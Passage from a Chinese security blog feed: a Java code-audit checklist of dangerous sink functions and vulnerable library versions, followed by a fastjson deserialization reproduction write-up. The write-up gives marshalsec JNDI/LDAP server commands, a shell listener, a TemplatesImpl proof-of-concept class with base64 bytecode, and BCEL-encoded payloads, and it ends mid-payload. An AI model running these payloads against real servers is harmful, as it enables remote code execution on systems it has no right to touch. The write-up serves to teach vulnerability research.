Getc(),fgetc(),getchar;read,printf</p><p><strong>ssrf</strong><br>HttpURLConnection.getInputStream<br>URlConnection.getInputStream<br>Request.Get.execute<br>Request.Post.execute<br>URL.openStrem<br>ImagesIO.read<br>OkHttpClient.newCall.execute<br>HttpClients.execute<br>HttpClinet.execute<br>HttpClient.executeMethod<br>HttpURLConnection.connect<br>HttpURLConnection.getInputStream<br>URL.openStream</p><p><strong>xxe</strong><br>XMLReaderFactory.createXMLReader();<br>new SAXReader<br>new SAXBuilder<br>DocumentBuilderFactory<br>XPathExpression<br>DocumentBuilder<br>TransformerFactory<br>javax.xml.parsers.DocumentBuilder<br>javax.xml.stream.XMLStreamReader<br>org.jdom.input.SAXBuilder<br>org.jdom2.input.SAXBuilder<br>javax.xml.parsers.SAXParser<br>org.dom4j.io.SAXReader<br>org.xml.sax.XMLReader<br>javax.xml.transform.sax.SAXSource<br>javax.xml.transform.TransformerFactory<br>javax.xml.transform.sax.SAXTransformerFactory<br>javax.xml.validation.SchemaFactory<br>javax.xml.bind.Unmarshaller</p><p>DocumentBuilder、XMLStreamReader、SAXBuilder、SAXParser SAXReader 、XMLReader SAXSource 、TransformerFactory 、SAXTransformerFactory 、 SchemaFactory</p><p><strong>硬编码</strong><br>密码硬编码、密码明文存储<br>password 、pass、jdbc</p><p><strong>xss</strong><br>getParamter、&lt;%=、param.</p><p><strong>spel表达式注入</strong><br>Spel是Spring框架el表达式的缩写，当使用SpelExpressionParser解析spel表达式，且表达式可被外部控制，则可能导致SPel表达式注入从而造成RCE，如CVE-2018-1260就是spring-security-oauth2的一个SPel注入导致的RCE 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser PARSER = new SpelExpressionParser();</span><br><span class="line">Expression exp = PARSER.parseExpression(el)</span><br><span class="line"></span><br><span class="line">@RequestMapping(path = &quot;/elinjection&quot;)</span><br><span class="line">public class SPelInjectionController &#123;</span><br><span class="line">    @RequestMapping(value=&quot;/spel.html&quot;,method= RequestMethod.GET)</span><br><span class="line">    public String SPelInjection(ModelMap modelMap, HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">        String el=request.getParameter(&quot;el&quot;);</span><br><span class="line">        //el=&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open /Applications/Calculator.app\&quot;)&quot;;</span><br><span class="line">        ExpressionParser PARSER = new SpelExpressionParser();</span><br><span class="line">        Expression exp = PARSER.parseExpression(el);</span><br><span class="line">        return (String)exp.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Expression<br>SpelExpressionParser<br>getValue</p><p><strong>文件上传</strong><br>MultipartFile</p><p><strong>Autobinding-自动绑定漏洞</strong><br>这里使用了@ModelAttribute User user，实际上这里是从session中获取user对象。但存在问题是如果在请求中添加user对象的成员变量时则会更改user对象对应成员的值。<br>所以当我们给resetQuestionHandler发送GET请求的时候可以添加“answer=hehe”参数，这样就可以给session中的对象赋值，将原本密码找回的安全问题答案修改成“hehe”。这样在最后一步校验安全问题时即可验证成功并找回密码<br>@SessionAttributes<br>@ModelAttribute</p><p><strong>压缩包文件上传</strong><br>看上传的文件是否可以控制解压路径<br>是否有xxe</p><p><strong>excel xxe</strong><br>Poi-ooxml.jar的XXE漏洞</p><p>xlsx-streamer.jar<br>XSSFReader()和document()函数</p><p><strong>URL重定向</strong><br>sendRedirect<br>setHeader<br>forward</p><p><strong>日志记录敏感信息</strong><br>log log.info logger.info</p><p><strong>不安全组件暴露</strong><br>activity 、 Broadcast Receiver 、 Content Provider 、 Service 、 inter-filter</p><p><strong>代码执行</strong><br>eval、system、exec</p><p><strong>越权</strong><br>水平、垂直越权不需关注特定函数，只要在处理用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存在漏洞</p><p><strong>批量请求</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value=&quot;/ifUserExit&quot;,method = RequestMethod.GET)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">ifUserExit</span><span class="params">(Model model, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String phone = request.getParameter(<span class="string">&quot;phone&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(! phone.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">boolean</span> ifex=userModel.ifuserExitByPhone(phone);</span><br><span class="line">        <span class="keyword">if</span> (!ifex)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;用户不存在&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;用户已被注册&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>信息泄露</strong><br>js中搜索<br>ip，密码，账号，测试账号，137，139，用户，ftp配置,192.168,  10.  http， https</p><p>预编译<br>SELECT * From table_name WHERE name=‘XX’ and password=‘YY’ and corporate=‘ZZ’</p><p>添加 ‘ or 1=1 -<br>SELECT * From table_name WHERE name=’’ and password=’’ and corporate=’’ or 1=1-‘<br>使用预编译后会吧后边当做一个整体</p><p>mybatis<br><strong>Statement的几种实现</strong><br>Statement 对象用于将SQL语句发送到数据库中。<br>Statement每次执行SQL语句，数据库都要执行SQL语句的编译，最好用于仅执行一次查询并返回结果的情形<br>1、执行静态SQL语句。通常通过Statement实例实现。<br>2、执行动态SQL语句。通常通过PreparedStatement实例实现。<br>3、执行数据库存储过程。通常通过CallableStatement实例实现。</p><p><strong>’和‘$’的区别</strong><br>sql 预编译指的是数据库驱动在发送 sql 语句和参数给 DBMS 之前对 sql 语句进行编译，这样 DBMS 执行 sql 时，就不需要重新编译。<br>‘#{ }’：解析为一个 JDBC 预编译语句（prepared statement）的参数标记符，一个‘ #{ }’ 被解析为一个参数占位符 ? 。<br>‘${ }’ 仅仅为一个纯粹的 string 替换，在动态 SQL 解析阶段将会进行变量替换。在预编译之前已经被变量替换了<br>‘${ }’变量的替换阶段是在动态 SQL 解析阶段，而’#{ }’变量的替换是在 DBMS 中。</p><p><strong>PreparedStatement与Statement有什么区别</strong><br>1.PreparedStatement能预编译，这条预编译的SQL查询语句能在将来的查询中重用，这样一来，它比Statement对象生成的查询速度更快。<br>2.PreparedStatement可以写动态参数化的查询<br>3.PreparedStatement可以防止SQL注入式攻击<br>4.PreparedStatement查询可读性更好，追加条件的语句很乱<br>5.PreparedStatement不允许一个占位符（？）有多个值</p><p>hibernate参数绑定</p><h2 id="快速审计"><a href="#快速审计" class="headerlink" title="快速审计"></a>快速审计</h2><p>1 查看jar包<br>2 标记为spring 然后查看路由<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15875255296560.jpg" alt="-w1597"></p><p>查找路由<br>@RequestMapping({</p><h2 id="jar包安全"><a href="#jar包安全" class="headerlink" title="jar包安全"></a>jar包安全</h2><p>fastjson &lt;=1.2.48可以rce；&lt;=1.2.58可以dos<br>Apache Shiro &lt; 1.24 反序列漏洞<br>jackson &lt;= 2.9.2 反序列化漏洞<br>Poi-ooxml.jar &lt;=3.11 dos xxe<br>xlsx-streamer.jar &lt;=2.0.0  xxe<br>Spring 5.0.x&lt; 5.0.6  Spring 4.3.x&lt; 4.3.7<br>Struts 2.0.4 - Struts 2.3.34 Struts 2.5.0 - Struts 2.5.16<br>XStream(XStream Core)&lt; 1.4.11.1 ;1.4.10可以直接rce，1.4.11.1利用jdni注入</p><p>dubbo版本&lt;2.7.5，http协议反序列化漏洞（CVE-2019-17564）<br>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4<br>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7<br>Apache Dubbo 2.5.x 的所有版本</p><h2 id="危险利用链"><a href="#危险利用链" class="headerlink" title="危险利用链"></a>危险利用链</h2><p>commons-fileupload 1.3.1<br>commons-io 2.4<br>commons-collections 3.1<br>commons-logging 1.2<br>commons-beanutils 1.9.2<br>org.slf4j:slf4j-api 1.7.21<br>com.mchange:mchange-commons-java 0.2.11<br>org.apache.commons:commons-collections 4.0<br>com.mchange:c3p0 0.9.5.2<br>org.beanshell:bsh 2.0b5<br>org.codehaus.groovy:groovy 2.3.9<br>org.springframework:spring-aop 4.1.4.RELEASE</p><h2 id="白盒检测"><a href="#白盒检测" class="headerlink" title="白盒检测"></a>白盒检测</h2><p>搜索以下函数：<br>ObjectInputStream.readObject<br>ObjectInputStream.readUnshared<br>XMLDecoder.readObject<br>Yaml.load<br>XStream.fromXML<br>ObjectMapper.readValue<br>JSON.parseObject</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cws6.github.io/2018/09/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90/">https://cws6.github.io/2018/09/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;常见的审计思路&lt;br&gt;1.查看目录结构，查看配置文件，判断框架信息&lt;br&gt;2.查看使用的类库包是否安全&lt;br&gt;3.filter、controller&lt;br&gt;4.数据查询&lt;br&gt;5.危险函数审计&lt;br&gt;6.查看xml配置的数据库信息和文件信息&lt;br&gt;7.黑盒测试对
      
    
    </summary>
    
    
      <category term="代码" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="java代码审计" scheme="http://yoursite.com/tags/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>fastjson黑盒测试与白盒审计</title>
    <link href="http://yoursite.com/2020/08/03/fastjson/"/>
    <id>http://yoursite.com/2020/08/03/fastjson/</id>
    <published>2020-08-02T16:00:00.000Z</published>
    <updated>2020-08-12T08:43:02.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介与漏洞史"><a href="#简介与漏洞史" class="headerlink" title="简介与漏洞史"></a>简介与漏洞史</h2><p>文章首发<a href="https://xz.aliyun.com/t/7104">先知</a></p><pre><code>java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、以及今天的主角fastjson，fastjson是阿里巴巴一个开源的json相关的java library，地址在这里，https://github.com/alibaba/fastjson，Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上，它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象.</code></pre><h3 id="fastjson漏洞历史"><a href="#fastjson漏洞历史" class="headerlink" title="fastjson漏洞历史"></a>fastjson漏洞历史</h3><p><strong>fastjson-1.2.24</strong><br>(fastjson接受的JSON可以通过<code>@type</code>字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作)<br><strong>fastjson-1.248以下</strong><br>(从而导致checkAutoType在检测是否为黑名单的时候绕了过去，因为上一步将com.sun.rowset.JdbcRowSetImpl放入了mapping中，checkAutoType中使用TypeUtils.getClassFromMapping(typeName)去获取class不为空，从而绕过了黑名单检测)<br><strong>fastjson-1.2.60以下</strong><br>(在此版本以下，字符串中包含\x转义字符时可以造成dos漏洞)</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地测试环境"><a href="#本地测试环境" class="headerlink" title="本地测试环境"></a>本地测试环境</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210627-8213791a-3605-1.jpg" alt=""><br>    本地的版本java版本为1.8.0_181<br>   fastjson版本为1.2.24<br>   tomcat 版本为 7</p><p> 然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p><p><strong>安全版本</strong><br><code>JDK</code>（ 8u121, 7u131, 6u141 ）<br><code>RMI</code>(JDK 6u132, 7u122, or 8u113 )</p><h3 id="fastjson两种利用方式-出网或者不能出网"><a href="#fastjson两种利用方式-出网或者不能出网" class="headerlink" title="fastjson两种利用方式 - 出网或者不能出网"></a>fastjson两种利用方式 - 出网或者不能出网</h3><p><strong>1.服务器出网</strong><br>   使用<code>jndi</code>注入<br>-<code>ldap-</code>rmi<br> ** 2.服务器不能出网**<br>   直接本地反序列化<br>-<code>BasicDataSource</code>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)<br>-<code>TemplatesImpl</code></p><h4 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h4><p>  <code>jndi</code>利用，其中分为rmi或者ldap,使用ldap限制比rmi小</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rmi利用</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://x.x.x.x/#Poc&quot; 9999</span><br><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://40.73.6.221:8080/#Poc&quot; 9999</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">ncat –lvvp 9998</span><br><span class="line">Burp发送poc</span><br></pre></td></tr></table></figure><p><strong>图三是获取shell</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210628-82a86de0-3605-1.jpg" alt=""></p><h4 id="不能出网"><a href="#不能出网" class="headerlink" title="不能出网"></a>不能出网</h4><p><strong>1.直接反序列化-_bytecodes直接反序列化Poc</strong></p><pre><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法而大部分的开发可能用用JSON.parse(input)就了事儿了，同时使用了parseObject和Feature.SupportNonPublicField设置的估计不多。所以说实际环境中挖掘fastjson的这个漏洞应该是可遇不可求</code></pre><blockquote><p>利用代码如下：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;poc.class_base64&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure><p>具体Poc.java代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Poc extends AbstractTranslet &#123;</span><br><span class="line">public Poc() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Poc t = new Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先编译poc得到字节码，然后用pyhton进行编码生成byte后的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">fin = open(r&quot;Poc.class&quot;, &quot;rb&quot;)</span><br><span class="line">fout = open(r&quot;en1.txt&quot;, &quot;w&quot;)</span><br><span class="line">s = base64.encodestring(fin.read()).replace(&quot;\n&quot;, &quot;&quot;)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure><blockquote><p>Poc1.class进行base64并且要替换换行’\n’, 后代码如下</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALcG9jMTExLmphdmEMAAgACQcAIQwAIgAjAQAMdG91Y2ggL3RtcC8xDAAkACUBAAZQb2MxMTEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACQAEAAoADQALAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAADgABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAEAAAAJuwAFWbcABlexAAAAAQALAAAACgACAAAAFAAIABUADAAAAAQAAQAUAAEAFQAAAAIAFg==</span><br></pre></td></tr></table></figure><blockquote><p>最终poc</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcAIQwAIgAjAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAJAAlAQADUG9jAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAsABAAMAA0ADQAMAAAABAABAA0AAQAOAA8AAQAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABEAAQAOABAAAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABYADAAAAAQAAQARAAkAEgATAAIACgAAACUAAgACAAAACbsABVm3AAZMsQAAAAEACwAAAAoAAgAAABkACAAaAAwAAAAEAAEAFAABABUAAAACABY=&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>关键调用链如下</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210630-83b6d546-3605-1.jpg" alt=""></p><p><strong>命令执行如下</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210631-84d0a466-3605-1.jpg" alt=""></p><p><strong>2.直接反序列化-dbcp</strong><br>依赖<br><code>commons-dbcp.jar</code><br>org.apache.commons.dbcp.BasicDataSource<br>Spring在第三方依赖包中包含了两个数据源的实现类包，其一是Apache的DBCP.</p><p>依赖<code>tomcat-dbcp.jar</code>(tomcat部署自带)<br>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>运行Poc1得到<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210632-85132278-3605-1.jpg" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$adR$ddj$TA$Y$3d$93$a4$d9d$bbmMc$5bS$ffZ$b5$9az$d1A$f0F$ob$b1$8a$85$d4$96$s$u$d2$ab$c9fLGvg$c2$ecD$82$P$e4$bd7V$U$7c$A$lJ$fcv$8dI$c0$80$V$dce$e6$9b9$7b$ce$f7$bb$df$7f$7c$f9$G$e0$3en$fb$f0$b0$e6$e3$Sj$r$ac$a7$f6$b2$87$x$3e$e6$b0$e6$e1$wC$f1$a1$d2$ca$3db$c8$d7$b7_2$U$9e$98$aedXj$w$z_$M$e2$8e$b4m$d1$89$I$f1$9f$OC$d9w$ca$e8$c4$c35$86$b2$b3B$to$8c$8d$Z$3e$d4$9b$a1$89y2$d0$dc$d8$k$X$7d$R$9eJ$3e$U$91$d0$5ci$t$ad$W$R$l$s$91$L$f9$de$e1Ac$s9$8e$s$d4$ae$8b$f9$5e$fb$60w$a8$92$7d$82$843$f6$ef$a2DZ$r$o$f5$5eZ$de$g$jE$9a$ees$a1$bb$91$b4$8d$b4$3a$fbo$89$9e$fc$87$a0$k$aeSWc$a14$c3j$fd$a4$f9V$bc$T$9c$e2$f5x$cbY$a5$7b$Ze$83$fa$db2$D$h$cag$wmv$e9$c8$84$3b$v3$40$Je$P$9b$Bn$e0$sC$e0$cc$m$3c$dd$e0$$$ee$f3$7b$Bna$8b$e6F$5c$86$c7$e7$ad$cb$O$b4S$b1$e4$bb$9d$84$s$Y$bav$3a$c6H$3a$86j$96$9a2$7c$ffp$3ck$86$H$e7u$fc$db$d1$94$b6$3a$vv$K$adL$d0$e3_$c9P$f5$3d$e9$c6$97$95$fav$f3$PN$83$ba$u$87$92J$bdS$9f$d1$c4$v$e8$c8$9aP$sI$D$9b$f4$93$7bH$9f$CX$daH$e4$e0$d3m$87$y$p$bbx$f7$M$ec3r$cb$f9O$u$bc$faH$I$c3$7c$8a$pO$fb$3c$a9$C$y$d0$h$8c$3c$y$d0Z$c4$S$ed$a9$97Z$86$92f$o$yfn$x$Z$ed$c2$uXJ$cb$cf$a2$ad$8e$fdV$u$b3eTG$82$z$b29$b2$e5$af$98$7b$7d$86bs$o$f4$b3$P5$we$7d$y$beHk$85$ce9$ac$fe$E$i$98$ab$f0$f4$D$A$A</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210632-8558b478-3605-1.jpg" alt=""></p><p>最终poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;: &#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A&quot;&#